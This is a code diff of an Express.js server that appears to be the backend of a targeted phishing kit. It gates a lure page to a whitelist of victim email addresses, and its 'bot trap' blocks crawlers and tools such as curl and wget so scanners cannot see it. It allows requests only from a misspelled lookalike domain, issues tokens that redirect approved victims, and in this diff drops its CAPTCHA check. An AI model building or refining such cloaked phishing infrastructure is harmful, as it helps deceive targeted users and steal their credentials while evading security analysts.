@@ -18,10 +18,10 @@ const DEBUG = process.env.DEBUG === 'true';
 let validEmails = new Set();
 let tokenMap = new Map();
 
-// ✅ Serve static files like lalaland.html from root
+// ✅ Serve static files like /lalaland.html
 app.use(express.static(path.join(__dirname)));
 
-// ✅ Bot trap
+// ✅ Bot trap logic
 app.use((req, res, next) => {
   const ua = req.headers['user-agent'] || '';
   const botIndicators = ['bot', 'crawler', 'spider', 'python', 'fetch', 'httpclient', 'wget', 'curl'];
@@ -31,12 +31,12 @@ app.use((req, res, next) => {
   next();
 });
 
-// ✅ Middleware
+// ✅ Security middleware
 app.use(helmet());
 app.use(express.json());
 app.use(cors({ origin: 'https://workteamshareseervices.info' }));
 
-// ✅ Force HTTPS
+// ✅ HTTPS enforcement
 app.use((req, res, next) => {
   if (req.headers['x-forwarded-proto'] !== 'https') {
     return res.redirect(`https://${req.headers.host}${req.url}`);
@@ -44,7 +44,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// ✅ Load valid emails
+// ✅ Load and reload email whitelist
 function loadEmails() {
   try {
     const data = fs.readFileSync(EMAIL_FILE, 'utf8');
@@ -56,11 +56,11 @@ function loadEmails() {
 }
 loadEmails();
 fs.watchFile(EMAIL_FILE, () => {
-  console.log('[INFO] Detected change in email list — reloading');
+  console.log('[INFO] Email list changed — reloading');
   loadEmails();
 });
 
-// ✅ Clean expired tokens
+// ✅ Token cleanup every 5 minutes
 setInterval(() => {
   const now = Date.now();
   for (const [token, info] of tokenMap.entries()) {
@@ -69,20 +69,18 @@ setInterval(() => {
       DEBUG && console.log(`[INFO] Expired token ${token} cleared`);
     }
   }
-}, 5 * 60 * 1000); // 5 minutes
+}, 5 * 60 * 1000);
 
-// ✅ Rate limiting (increased capacity + strategy)
+// ✅ Rate limiting
 app.use(rateLimit({
-  windowMs: 60 * 1000, // 1 minute
-  max: 800, // increased to 800 requests per minute
-  standardHeaders: true,
-  legacyHeaders: false,
-  message: { valid: false, message: 'Too many requests. Please wait a moment.' }
+  windowMs: 60 * 1000,
+  max: 300,
+  message: { valid: false, message: 'Too many requests. Try again later.' }
 }));
 
-// ✅ Email + CAPTCHA endpoint
+// ✅ Main verification route (NO CAPTCHA)
 app.post('/api/check-email', async (req, res) => {
-  const { email, captchaToken, middleName } = req.body;
+  const { email, middleName } = req.body;
 
   if (middleName && middleName.trim() !== '') {
     return res.status(403).json({ valid: false, message: 'Bot activity detected' });
@@ -90,26 +88,6 @@ app.post('/api/check-email', async (req, res) => {
 
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
     return res.status(400).json({ valid: false, message: 'Enter a valid email address' });
-  }
-
-  if (!captchaToken) {
-    return res.status(400).json({ valid: false, message: 'Captcha missing' });
-  }
-
-  try {
-    const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
-    });
-    const result = await verify.json();
-    console.log('[CAPTCHA RESULT]', result);
-    if (!result.success) {
-      console.log('[CAPTCHA ERROR]', result['error-codes']);
-      return res.status(400).json({ valid: false, message: 'Captcha failed. Reload page' });
-    }
-  } catch (err) {
-    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
   }
 
   const normalized = email.toLowerCase();
@@ -132,7 +110,7 @@ app.post('/api/check-email', async (req, res) => {
   return res.json({ valid: true, redirectUrl });
 });
 
-// ✅ Final redirect handler
+// ✅ Final redirect logic
 app.get('/forward', (req, res) => {
   const { token } = req.query;
   const entry = tokenMap.get(token);
